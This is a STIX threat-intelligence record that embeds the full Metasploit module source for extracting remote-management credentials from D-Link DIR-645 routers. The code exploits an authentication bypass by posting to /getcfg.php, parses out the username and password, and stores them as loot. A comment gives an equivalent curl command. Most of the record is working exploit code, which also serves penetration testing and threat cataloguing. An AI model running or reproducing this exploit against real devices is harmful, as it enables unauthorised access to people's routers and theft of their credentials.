{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--113afe49-944c-4cd1-a6d8-6b01ee6d91ab",
    "created": "2024-08-14T16:23:43.750549Z",
    "modified": "2024-08-14T16:23:43.750553Z",
    "name": "D-Link DIR 645 Password Extractor",
    "description": " This module exploits an authentication bypass vulnerability in DIR 645 < v1.03. With this vulnerability you are able to extract the password for the remote management.  'References' => [ [ 'OSVDB', '90733' ] [ 'BID', '58231' ] [ 'PACKETSTORM', '120591' ] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/dlink_dir_645_password_extractor.rb",
            "external_id": "dlink_dir_645_password_extractor.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name' => 'D-Link DIR 645 Password Extractor',\n      'Description' => %q{\n          This module exploits an authentication bypass vulnerability in DIR 645 < v1.03.\n        With this vulnerability you are able to extract the password for the remote\n        management.\n      },\n      'References' => [\n        [ 'OSVDB', '90733' ],\n        [ 'BID', '58231' ],\n        [ 'PACKETSTORM', '120591' ]\n      ],\n      'Author' => [\n        'Roberto Paleari <roberto[at]greyhats.it>', # Vulnerability discovery\n        'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n      ],\n      'License' => MSF_LICENSE\n    )\n  end\n\n  def run\n    vprint_status(\"#{rhost}:#{rport} - Trying to access the configuration of the device\")\n\n    # Curl request:\n    # curl -d SERVICES=DEVICE.ACCOUNT http://192.168.178.200/getcfg.php | egrep \"\\<name|password\"\n\n    # download configuration\n    begin\n      res = send_request_cgi({\n        'uri' => '/getcfg.php',\n        'method' => 'POST',\n        'vars_post' =>\n          {\n            'SERVICES' => 'DEVICE.ACCOUNT'\n          }\n      })\n\n      return if res.nil?\n      return if (res.headers['Server'].nil? || res.headers['Server'] !~ (/DIR-645 Ver 1\\.0/))\n      return if (res.code == 404)\n\n      if res.body =~ %r{<password>(.*)</password>}\n        print_good(\"#{rhost}:#{rport} - credentials successfully extracted\")\n\n        # store all details as loot -> there is some usefull stuff in the response\n        loot = store_loot('dlink.dir645.config', 'text/plain', rhost, res.body)\n        print_good(\"#{rhost}:#{rport} - Account details downloaded to: #{loot}\")\n\n        res.body.each_line do |line|\n          if line =~ %r{<name>(.*)</name>}\n            @user = ::Regexp.last_match(1)\n            next\n          end\n          next unless line =~ %r{<password>(.*)</password>}\n\n          pass = ::Regexp.last_match(1)\n          vprint_good(\"user: #{@user}\")\n          vprint_good(\"pass: #{pass}\")\n\n          connection_details = {\n            module_fullname: fullname,\n            username: @user,\n            private_data: pass,\n            private_type: :password,\n            workspace_id: myworkspace_id,\n            proof: line,\n            last_attempted_at: DateTime.now, # kept in refactor may not be valid, obtained but do not attempted here\n            status: Metasploit::Model::Login::Status::UNTRIED\n          }.merge(service_details)\n          create_credential_and_login(connection_details)\n\n          report_cred(\n            ip: rhost,\n            port: rport,\n            service_name: 'http',\n            user: @user,\n            password: pass,\n            proof: line\n          )\n        end\n      end\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return\n    end\n  end\nend\n"
}